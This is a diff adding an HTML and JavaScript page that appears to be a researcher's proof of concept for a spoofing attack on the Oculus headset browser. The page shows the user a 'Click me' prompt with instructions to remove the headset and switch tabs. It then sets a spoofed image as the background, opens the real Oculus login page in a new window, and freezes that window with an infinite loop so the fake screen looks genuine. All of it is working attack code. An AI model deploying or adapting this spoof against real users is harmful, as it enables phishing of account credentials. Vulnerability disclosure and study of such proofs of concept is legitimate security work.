@@ -1,0 +1,46 @@
+<body><div id="content-1">
+    <h1>Click me</h1>
+    <span>then take off the glass, wait it to turn the light of and put it again</span>
+    <span>wait for three more seconds and change the tab back to the previous one</span>
+</div>
+<!-- <div id="content-2" style="visibility: hidden">
+   <img src="https://lemonslab.me/pocs/meta/oculus/images/spoof-e128e4b3-4d37-48b0-8386-703e9ab91a15.png" style="width:100%;height:100%"></img>
+</div> -->
+<script src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
+<script>
+let myWindow;
+$(function() {
+  
+  onclick = () => {
+    
+    $('body').css('background-image', 'url("https://lemonslab.me/pocs/meta/oculus/images/spoof-e128e4b3-4d37-48b0-8386-703e9ab91a15.png")');
+    $('#content-1').hide().delay(200).queue(function() {
+        myWindow = window.open('https://auth.oculus.com/login-without-facebook/', '_blank');
+        sleepFor(5000);
+
+      $(this).dequeue();
+    });
+   
+    
+    
+  }
+});
+
+
+function freeze(myWindow) {
+    for (;;) {
+      myWindow.console.log('A');
+    }
+}
+
+function sleepFor(sleepDuration){
+    var now = new Date().getTime();
+    while(new Date().getTime() < now + sleepDuration){
+
+    }
+    freeze(myWindow)
+}
+
+</script>
+</body>
+
